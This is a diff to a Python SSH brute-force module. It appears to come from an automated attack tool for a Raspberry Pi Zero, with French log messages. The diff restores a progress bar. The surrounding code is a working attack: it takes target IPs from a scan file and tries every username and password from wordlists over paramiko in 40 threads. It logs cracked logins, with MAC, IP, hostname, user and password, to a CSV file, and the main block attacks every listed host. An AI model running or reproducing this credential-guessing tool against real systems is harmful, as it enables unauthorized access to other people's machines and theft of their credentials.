@@ -9,8 +9,8 @@ import socket
 import threading
 import logging
 from queue import Queue
-# from rich.console import Console
-# from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from shared import SharedData
 from logger import Logger
 
@@ -39,7 +39,7 @@ class SSHBruteforce:
         """
         logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
         return self.ssh_connector.run_bruteforce(ip, port)
-
+    
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute force attack and update status.
@@ -72,7 +72,7 @@ class SSHConnector:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # List to store results temporarily
         self.queue = Queue()
-        # self.console = Console()
+        self.console = Console()
 
     def load_scan_file(self):
         """
@@ -89,7 +89,7 @@ class SSHConnector:
         """
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+        
         try:
             ssh.connect(adresse_ip, username=user, password=password, banner_timeout=200)  # Adjust timeout as necessary
             return True
@@ -98,7 +98,7 @@ class SSHConnector:
         finally:
             ssh.close()  # Ensure the SSH connection is closed
 
-    def worker(self, success_flag):
+    def worker(self, progress, task_id, success_flag):
         """
         Worker thread to process items in the queue.
         """
@@ -116,6 +116,7 @@ class SSHConnector:
                     self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
+            progress.update(task_id, advance=1)
 
 
     def run_bruteforce(self, adresse_ip, port):
@@ -125,7 +126,7 @@ class SSHConnector:
         hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
 
         total_tasks = len(self.users) * len(self.passwords)
-
+        
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
@@ -135,27 +136,27 @@ class SSHConnector:
 
         success_flag = [False]
         threads = []
+        
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
+            task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
+            
+            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
+                t.start()
+                threads.append(t)
 
-        # with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-        # task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
+            while not self.queue.empty():
+                if self.shared_data.orchestrator_should_exit:
+                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                    while not self.queue.empty():
+                        self.queue.get()
+                        self.queue.task_done()
+                    break
 
-        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-            t = threading.Thread(target=self.worker, args=(success_flag))
-            t.start()
-            threads.append(t)
+            self.queue.join()
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    self.queue.get()
-                    self.queue.task_done()
-                break
-
-        self.queue.join()
-
-        for t in threads:
-            t.join()
+            for t in threads:
+                t.join()
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
@@ -181,16 +182,16 @@ if __name__ == "__main__":
     try:
         ssh_bruteforce = SSHBruteforce(shared_data)
         logger.info("Démarrage de l'attaque SSH... sur le port 22")
-
+        
         # Load the netkb file and get the IPs to scan
         ips_to_scan = shared_data.read_data()
-
+        
         # Execute the brute force on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             logger.info(f"Executing SSHBruteforce on {ip}...")
             ssh_bruteforce.execute(ip, b_port, row, b_status)
-
+        
         logger.info(f"Nombre total de succès: {len(ssh_bruteforce.ssh_connector.results)}")
         exit(len(ssh_bruteforce.ssh_connector.results))
     except Exception as e:
